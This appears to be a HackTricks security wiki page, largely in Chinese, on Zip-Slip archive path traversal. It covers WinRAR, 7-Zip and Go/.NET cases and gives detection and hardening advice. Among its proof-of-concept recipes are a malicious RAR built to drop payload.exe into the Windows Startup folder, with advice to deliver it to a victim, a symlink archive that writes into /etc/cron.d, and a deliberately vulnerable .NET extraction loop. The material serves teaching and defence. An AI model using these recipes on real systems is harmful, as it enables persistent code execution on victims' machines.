# Archive Extraction Path Traversal ("Zip-Slip" / WinRAR CVE-2025-8088)

{{#include ../banners/hacktricks-training.md}}

## 概述

许多归档格式（ZIP、RAR、TAR、7-ZIP 等）允许每个条目携带其自身的 **内部路径**。当解压工具盲目信任该路径时，包含 `..` 的恶意文件名或一个 **绝对路径**（例如 `C:\Windows\System32\`）可能会被写入到用户选择目录之外的位置。
这类漏洞广泛称为 *Zip-Slip* 或 **archive extraction path traversal**。

## 后果

后果可从覆盖任意文件扩展到通过将 payload 放置在自动运行位置（例如 Windows *Startup* 文件夹）直接实现 **remote code execution (RCE)**。

## 根本原因

1. 攻击者创建一个归档文件，其一个或多个文件头包含：
   * 相对路径遍历序列（`..\..\..\Users\\victim\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\payload.exe`）
   * 绝对路径（`C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\payload.exe`）
   * 或精心构造的 **symlinks**，解析后位于目标目录之外（在 ZIP/TAR 的 *nix* 系统上常见）。
2. 受害者使用一个易受攻击的工具解压该归档，该工具信任嵌入的路径（或跟随 symlinks），而不是对其进行清理或强制将提取限制在所选目录之下。
3. 文件被写入攻击者可控的位置，并在系统或用户下次触发该路径时被执行/加载。

### .NET `Path.Combine` + `ZipArchive` traversal

一个常见的 .NET 反模式是将预期的目标路径与 **受用户控制的** `ZipArchiveEntry.FullName` 组合，并在不进行路径规范化的情况下提取：
```csharp
using (var zip = ZipFile.OpenRead(zipPath))
{
foreach (var entry in zip.Entries)
{
var dest = Path.Combine(@"C:\samples\queue\", entry.FullName); // drops base if FullName is absolute
entry.ExtractToFile(dest);
}
}
```
- 如果 `entry.FullName` starts with `..\\` it traverses; 如果它是一个 **绝对路径** the left-hand component is discarded entirely, yielding an **任意文件写入** as the extraction identity.
- 用于写入由计划扫描器监视的同级 `app` 目录的概念验证归档:
```python
import zipfile
with zipfile.ZipFile("slip.zip", "w") as z:
z.writestr("../app/0xdf.txt", "ABCD")
```
将该 ZIP 投放到受监视的收件箱中会导致 `C:\samples\app\0xdf.txt`，证明可在 `C:\samples\queue\` 之外发生目录遍历，并启用后续原语（例如 DLL hijacks）。

## 真实案例 – WinRAR ≤ 7.12 (CVE-2025-8088)

适用于 Windows 的 WinRAR（包括 `rar` / `unrar` CLI、DLL 和可移植源码）在解压期间未对文件名进行验证。
一个恶意的 RAR 存档包含类似如下的条目：
```text
..\..\..\Users\victim\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\payload.exe
```
会最终落在所选输出目录的**外部**，并放入用户的 *Startup* 文件夹中。登录后 Windows 会自动执行其中的所有内容，从而提供*持久性* RCE。

### 构建 PoC Archive (Linux/Mac)
```bash
# Requires rar >= 6.x
mkdir -p "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
cp payload.exe "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/"
rar a -ep evil.rar evil/*
```
使用的选项：
* `-ep`  – 精确按给定存储文件路径（不要修剪前导的 `./`）。

将 `evil.rar` 交付给受害者，并指示他们使用存在漏洞的 WinRAR 版本解压。

### Observed Exploitation in the Wild

ESET 报告 RomCom (Storm-0978/UNC2596) 的鱼叉式钓鱼活动附带利用 CVE-2025-8088 的 RAR 归档，用于部署定制后门并协助勒索软件行动。

## Newer Cases (2024–2025)

### 7-Zip ZIP symlink traversal → RCE (CVE-2025-11001 / ZDI-25-949)
* **漏洞**：ZIP 条目为 **symbolic links** 时，在解压过程中会被取消引用，允许攻击者逃离目标目录并覆盖任意路径。用户交互仅为*打开/解压*归档。
* **受影响**：7-Zip 21.02–24.09（Windows 与 Linux 构建）。已在 **25.00**（2025 年 7 月）及更高版本修复。
* **影响路径**：覆盖 `Start Menu/Programs/Startup` 或服务运行位置 → 在下次登录或服务重启时执行代码。
* **快速 PoC (Linux)**：
```bash
mkdir -p out
ln -s /etc/cron.d evil
zip -y exploit.zip evil   # -y preserves symlinks
7z x exploit.zip -o/tmp/target   # vulnerable 7-Zip writes to /etc/cron.d
```
在已修补的构建中 `/etc/cron.d` 将不会被触及；symlink 会作为链接被提取到 /tmp/target 内。

### Go mholt/archiver Unarchive() Zip-Slip (CVE-2025-3445)
* **漏洞**：`archiver.Unarchive()` 会跟随 `../` 和通过 symlink 指向的 ZIP 条目，写出到 `outputDir` 之外。
* **受影响**：`github.com/mholt/archiver` ≤ 3.5.1（项目现已弃用）。
* **修复**：切换到 `mholt/archives` ≥ 0.1.0 或在写入前实现规范路径检查。
* **最小复现示例**：
```go
// go test . with archiver<=3.5.1
archiver.Unarchive("exploit.zip", "/tmp/safe")
// exploit.zip holds ../../../../home/user/.ssh/authorized_keys
```

## Detection Tips

* **Static inspection** – 列出归档条目并标记任何名称包含 `../`、`..\\`、*绝对路径*（`/`, `C:`）或类型为 *symlink* 且其目标位于提取目录之外的条目。
* **Canonicalisation** – 确保 `realpath(join(dest, name))` 仍以 `dest` 开头。否则拒绝。
* **Sandbox extraction** – 使用*安全*解压器（例如 `bsdtar --safe --xattrs --no-same-owner`、7-Zip ≥ 25.00）将内容解压到可丢弃目录并验证结果路径保持在该目录内。
* **Endpoint monitoring** – 在 WinRAR/7-Zip 等打开归档后短时间内，对写入 `Startup`/`Run`/`cron` 位置的新可执行文件触发告警。

## Mitigation & Hardening

1. **Update the extractor** – WinRAR 7.13+ 和 7-Zip 25.00+ 实现了路径/符号链接清理。两者仍然缺乏自动更新功能。
2. 解压时尽可能使用“**Do not extract paths**”/“**Ignore paths**”。
3. 在 Unix 上，在解压前降权限并挂载 **chroot/namespace**；在 Windows 上，使用 **AppContainer** 或沙箱。
4. 如果编写自定义代码，在创建/写入**之前**使用 `realpath()`/`PathCanonicalize()` 进行规范化，并拒绝任何逃出目标目录的条目。

## Additional Affected / Historical Cases

* 2018 – Snyk 发布的大规模 *Zip-Slip* 通告，影响许多 Java/Go/JS 库。
* 2023 – 7-Zip CVE-2023-4011，类似的在 `-ao` 合并时的遍历。
* 2025 – HashiCorp `go-slug` (CVE-2025-0377) 在 slugs 的 TAR 解压遍历（在 v1.2 中修补）。
* 任何在写入前未调用 `PathCanonicalize` / `realpath` 的自定义解压逻辑。

## References

- [Trend Micro ZDI-25-949 – 7-Zip symlink ZIP traversal (CVE-2025-11001)](https://www.zerodayinitiative.com/advisories/ZDI-25-949/)
- [JFrog Research – mholt/archiver Zip-Slip (CVE-2025-3445)](https://research.jfrog.com/vulnerabilities/archiver-zip-slip/)
- [Meziantou – Prevent Zip Slip in .NET](https://www.meziantou.net/prevent-zip-slip-in-dotnet.htm)
- [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)

{{#include ../banners/hacktricks-training.md}}
